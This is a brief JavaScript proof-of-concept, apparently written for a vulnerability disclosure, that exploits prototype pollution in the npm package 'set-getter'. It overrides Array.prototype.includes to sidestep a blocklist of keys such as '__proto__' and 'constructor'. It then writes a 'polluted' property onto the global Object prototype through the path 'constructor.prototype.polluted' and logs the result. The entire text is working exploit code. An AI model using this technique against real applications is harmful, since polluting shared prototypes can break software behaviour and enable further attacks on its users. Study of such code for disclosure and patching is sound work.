Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var setGetter = require('set-getter');
var obj = {};
console.log({}.polluted);
setGetter(obj, 'constructor.prototype.polluted', function (polluted) {
    return 'yes';
});
console.log({}.polluted);